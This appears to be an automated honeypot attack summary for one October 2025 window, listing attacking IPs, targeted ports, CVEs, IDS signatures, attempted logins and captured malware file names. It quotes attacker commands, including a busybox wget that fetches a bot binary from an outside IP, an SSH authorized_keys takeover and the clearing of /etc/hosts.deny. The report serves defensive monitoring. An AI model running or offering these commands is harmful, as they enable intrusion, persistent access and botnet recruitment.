Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-27T01:01:39Z
**Timeframe:** 2025-10-27T00:20:01Z to 2025-10-27T01:00:01Z
**Files Used:**
- agg_log_20251027T002001Z.json
- agg_log_20251027T004001Z.json
- agg_log_20251027T010001Z.json

### Executive Summary
This report summarizes 15,928 malicious activities recorded by honeypots within the specified timeframe. The majority of attacks were captured by the Cowrie honeypot. A significant portion of the attacks originated from the IP address `198.23.190.58`. The most targeted port was 5060 (SIP), and the most frequently observed vulnerability was CVE-2005-4050, related to SIP UDP overflow. Attackers were observed attempting to modify SSH authorized keys and downloading malicious payloads.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 6764
- Sentrypeer: 2888
- Ciscoasa: 1885
- Honeytrap: 1837
- Suricata: 1691
- Dionaea: 584
- Adbhoney: 68
- Mailoney: 87
- H0neytr4p: 54
- Tanner: 50
- ConPot: 11
- Redishoneypot: 3
- Honeyaml: 5
- Wordpot: 1

**Top Attacking IPs:**
- 198.23.190.58: 1606
- 137.184.179.27: 938
- 144.172.108.231: 827
- 144.130.11.9: 555
- 185.243.5.148: 502
- 116.71.136.125: 356
- 103.171.85.219: 285
- 178.128.152.40: 308
- 95.215.108.8: 307
- 185.243.5.158: 307

**Top Targeted Ports/Protocols:**
- 5060: 2888
- 22: 1008
- UDP/5060: 430
- 445: 553
- 25: 87
- TCP/22: 75
- 80: 40
- 443: 54

**Most Common CVEs:**
- CVE-2005-4050: 422
- CVE-2002-0013 CVE-2002-0012: 12
- CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 6
- CVE-2021-44228 CVE-2021-44228: 5
- CVE-2019-11500 CVE-2019-11500: 2
- CVE-2014-2321 CVE-2014-2321: 2
- CVE-2025-22457 CVE-2025-22457: 1

**Commands Attempted by Attackers:**
- `cd ~; chattr -ia .ssh; lockr -ia .ssh`
- `lockr -ia .ssh`
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
- `ls -lh $(which ls)`
- `uname -a`
- `whoami`
- `Enter new UNIX password:`
- `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.uhavenobotsxd; ...`

**Signatures Triggered:**
- ET VOIP MultiTech SIP UDP Overflow (2003237)
- ET DROP Dshield Block Listed Source group 1 (2402000)
- ET SCAN NMAP -sS window 1024 (2009582)
- ET SCAN MS Terminal Server Traffic on Non-standard Port (2023753)
- ET INFO Reserved Internal IP Traffic (2002752)
- ET HUNTING RDP Authentication Bypass Attempt (2034857)
- GPL TELNET Bad Login (2101251)
- ET SCAN Suspicious inbound to PostgreSQL port 5432 (2010939)

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- bash/Drag1823hcacatcuciocolataABC111
- ubuntu/tizi@123
- root/3245gs5662d34
- root/02041992Ionela%^&
- jla/xurros22$
- ubuntu/ubuntu
- root/Holidays.2015
- GET /solr/admin/info/system HTTP/1.1...

**Files Uploaded/Downloaded:**
- arm.uhavenobotsxd
- arm5.uhavenobotsxd
- arm6.uhavenobotsxd
- arm7.uhavenobotsxd
- x86_32.uhavenobotsxd
- mips.uhavenobotsxd
- mipsel.uhavenobotsxd

**HTTP User-Agents:**
- Go-http-client/1.1

**SSH Clients and Servers:**
- No specific SSH client or server software versions were logged.

**Top Attacker AS Organizations:**
- No AS organization data was available in the logs.

### Key Observations and Anomalies
- A significant number of commands are focused on taking over the system via SSH by adding a new authorized key. This is a common tactic for establishing persistent access.
- The `uhavenobotsxd` malware payloads suggest a campaign targeting various CPU architectures, particularly for IoT or embedded devices.
- The base64 encoded perl script is a known IRC bot used for DDoS attacks, indicating attempts to recruit the honeypot into a botnet.
- The prevalence of SIP-related attacks (port 5060 and CVE-2005-4050) highlights the ongoing targeting of VoIP infrastructure.
- The IP `137.184.179.27` showed a sudden burst of activity in the last analysis period, responsible for over 900 connection attempts, which warrants further monitoring.
